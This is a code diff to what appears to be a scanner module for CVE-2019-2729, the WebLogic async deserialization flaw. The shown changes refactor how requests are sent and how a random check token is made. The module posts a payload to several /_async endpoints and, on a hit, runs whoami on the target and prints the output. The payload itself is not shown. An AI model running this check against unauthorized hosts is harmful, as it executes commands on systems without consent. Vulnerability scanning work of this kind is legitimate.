@@ -7,19 +7,13 @@ description: CVE-2019-2729漏洞可执行任意命令
 
 import sys
 import time
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2019_2729_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.url_suffix = ['/_async/AsyncResponseService',
                            '/_async/AsyncResponseServiceHttps',
                            '/_async/AsyncResponseServiceJms',
@@ -9779,10 +9773,10 @@ class CVE_2019_2729_BaseVerify:
         for url_suffix in self.url_suffix:
             url = self.url + url_suffix
             try:
-                check_req = requests.post(url, headers = self.check_headers, data = self.payload, timeout = 1)
+                check_req = request.post(url, headers = self.check_headers, data = self.payload)
                 if self.capta in check_req.text:
                     flag = 1
-                    cmd_req = requests.post(url, headers = self.cmd_headers, data = self.payload, timeout = 1)
+                    cmd_req = request.post(url, headers = self.cmd_headers, data = self.payload)
                     print('存在CVE-2019-2729漏洞,执行whoami命令结果为:', cmd_req.text)
                     break
             except Exception as e:
